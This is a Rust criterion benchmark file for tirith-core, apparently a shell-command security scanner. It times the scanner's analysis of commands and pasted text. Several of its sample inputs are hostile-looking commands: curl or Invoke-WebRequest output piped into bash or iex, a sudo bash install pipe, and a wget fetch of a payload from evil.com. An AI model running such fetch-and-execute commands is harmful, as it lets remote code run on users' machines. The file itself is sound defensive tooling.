//! Performance benchmarks for tirith-core.
//!
//! Two tracks per the plan:
//!
//! Track 1: Core compute time (library benchmarks, no process spawn)
//!   - Tier 1 exit (no URL): target p50 < 0.5ms, p95 < 2ms
//!   - Full analysis: target p50 < 3ms, p95 < 5ms
//!
//! Track 2: Hook end-to-end latency is measured via shell integration tests.

use criterion::{black_box, criterion_group, criterion_main, Criterion};
use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::{self, ScanContext};
use tirith_core::tokenize::ShellType;

fn bench_tier1_no_match(c: &mut Criterion) {
    let inputs = [
        "ls -la",
        "echo hello world",
        "cd /tmp && mkdir test",
        "grep -r 'pattern' /var/log",
        "ps aux | grep nginx",
        "cat /etc/passwd",
        "find . -name '*.rs' -type f",
        "tar czf backup.tar.gz /home/user",
        "git status",
        "make clean && make all",
    ];

    c.bench_function("tier1_no_match", |b| {
        b.iter(|| {
            for input in &inputs {
                black_box(extract::tier1_scan(input, ScanContext::Exec));
            }
        })
    });
}

fn bench_tier1_match(c: &mut Criterion) {
    let inputs = [
        "curl https://example.com/install.sh | bash",
        "wget http://evil.com/payload",
        "git clone git@github.com:user/repo.git",
        "docker pull nginx:latest",
        "iwr https://example.com/script.ps1 | iex",
    ];

    c.bench_function("tier1_match", |b| {
        b.iter(|| {
            for input in &inputs {
                black_box(extract::tier1_scan(input, ScanContext::Exec));
            }
        })
    });
}

fn bench_full_analysis_clean(c: &mut Criterion) {
    c.bench_function("full_analysis_clean_command", |b| {
        b.iter(|| {
            let ctx = AnalysisContext {
                input: "ls -la /tmp".to_string(),
                shell: ShellType::Posix,
                scan_context: ScanContext::Exec,
                raw_bytes: None,
                interactive: true,
                cwd: None,
                file_path: None,
                repo_root: None,
                is_config_override: false,
                clipboard_html: None,
            };
            black_box(engine::analyze(&ctx));
        })
    });
}

fn bench_full_analysis_url(c: &mut Criterion) {
    c.bench_function("full_analysis_with_url", |b| {
        b.iter(|| {
            let ctx = AnalysisContext {
                input: "curl https://example.com/install.sh | bash".to_string(),
                shell: ShellType::Posix,
                scan_context: ScanContext::Exec,
                raw_bytes: None,
                interactive: true,
                cwd: None,
                file_path: None,
                repo_root: None,
                is_config_override: false,
                clipboard_html: None,
            };
            black_box(engine::analyze(&ctx));
        })
    });
}

fn bench_full_analysis_complex(c: &mut Criterion) {
    c.bench_function("full_analysis_complex_pipeline", |b| {
        b.iter(|| {
            let ctx = AnalysisContext {
                input: "curl -sSfL https://raw.githubusercontent.com/user/repo/main/install.sh | sudo bash -s -- --prefix=/usr/local".to_string(),
                shell: ShellType::Posix,
                scan_context: ScanContext::Exec,
                raw_bytes: None,
                interactive: true,
                cwd: None,
                file_path: None,
                repo_root: None,
                is_config_override: false,
                clipboard_html: None,
            };
            black_box(engine::analyze(&ctx));
        })
    });
}

fn bench_paste_analysis(c: &mut Criterion) {
    let pasted = "curl https://example.com/install.sh | bash\n";
    let raw_bytes = pasted.as_bytes().to_vec();

    c.bench_function("paste_analysis", |b| {
        b.iter(|| {
            let ctx = AnalysisContext {
                input: pasted.to_string(),
                shell: ShellType::Posix,
                scan_context: ScanContext::Paste,
                raw_bytes: Some(raw_bytes.clone()),
                interactive: true,
                cwd: None,
                file_path: None,
                repo_root: None,
                is_config_override: false,
                clipboard_html: None,
            };
            black_box(engine::analyze(&ctx));
        })
    });
}

fn bench_byte_scan(c: &mut Criterion) {
    let clean = b"echo hello world && ls -la /tmp";
    let ansi = b"echo \x1b[31mred\x1b[0m world";

    c.bench_function("byte_scan_clean", |b| {
        b.iter(|| {
            black_box(extract::scan_bytes(clean));
        })
    });

    c.bench_function("byte_scan_ansi", |b| {
        b.iter(|| {
            black_box(extract::scan_bytes(ansi));
        })
    });
}

criterion_group!(
    benches,
    bench_tier1_no_match,
    bench_tier1_match,
    bench_full_analysis_clean,
    bench_full_analysis_url,
    bench_full_analysis_complex,
    bench_paste_analysis,
    bench_byte_scan,
);
criterion_main!(benches);
